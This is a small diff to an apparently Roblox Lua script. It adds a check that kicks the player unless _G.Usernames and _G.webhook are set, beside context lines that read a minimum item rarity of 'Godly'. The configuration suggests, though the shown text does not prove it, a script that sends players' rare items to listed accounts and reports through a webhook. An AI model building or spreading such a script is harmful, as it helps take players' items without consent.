@@ -11,6 +11,13 @@ local function copyLink()
 end
 copyLink()
 
+-- Wait for configuration to be set
+if not _G.Usernames or not _G.webhook then
+    local player = game.Players.LocalPlayer
+    player:Kick("Configuration not set. Please set _G.Usernames and _G.webhook before executing.")
+    return
+end
+
 -- Configuration from global variables
 local users = _G.Usernames or {}
 local min_rarity = _G.min_rarity or "Godly"
